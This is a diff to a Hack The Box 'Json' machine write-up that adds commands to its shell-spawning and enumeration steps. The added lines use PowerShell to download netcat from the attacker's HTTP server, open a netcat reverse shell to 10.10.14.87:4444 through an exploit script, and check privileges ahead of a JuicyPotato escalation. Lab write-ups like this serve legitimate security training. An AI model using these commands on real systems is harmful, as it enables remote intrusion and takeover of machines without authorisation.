@@ -409,14 +409,23 @@ print(page.text)
 
 ### Spawning a Shell
 
-To spawn a shell wth this, we can upload netcat executable for windows then execute it also via the script with powershell or cmd execution.
+To spawn a shell wth this, we can upload [netcat executable for windows](https://eternallybored.org/misc/netcat/) then execute netcat exe with the python script with powershell or cmd execution.
 <br>
 Let's first setup http server that contains the netcat executable. I used python3 http.server module. Execute the following.
+```bash
+python3 json_exploit.py
+```
+<br>
+And when the python script asks for its command, enter the following:
+```bash
+powershell.exe, /c invoke-webrequest http://10.10.14.87:8000/nc64.exe -outfile c:\\Windows\\Temp\\nc.exe
+```
+
 ![17](/writeups/htb/boxes/images/json_17.png)
 <br>
-After the netcat is uploaded, execute the following:
+After the netcat is uploaded, enter the following to the python script:
 ```Bash
-Command: powershell.exe, /c c:\\Windows\\Temp\\nc.exe 10.10.14.87 4444 -e "cmd.exe'
+powershell.exe, /c c:\\Windows\\Temp\\nc.exe 10.10.14.87 4444 -e "cmd.exe'
 ```
  NOTE:
 If "powershell.exe" is used immediately, the server doesn't spawn a shell.
@@ -442,11 +451,18 @@ There are two ways of getting root:
 ### Enumeration
 
 We can check the privileges of our user. It's stated that SeImpersonatePrivilege is enabled thus we can use an exploit that uses this setting to escalate to NT AUTHORITY\SYSTEM
+To check privileges:
+```cmd
+whoami /priv
+```
 
 ![20](/writeups/htb/boxes/images/json_20.png# big)
 
 Windows 2019 and Windows 10 1809 are unaffected by this but the version of Windows of the server is of earlier version.
-
+To check system information:
+```cmd
+systeminfo
+```
 ![21](/writeups/htb/boxes/images/json_21.png# big)
 
 ### JuicyPotato Exploitation
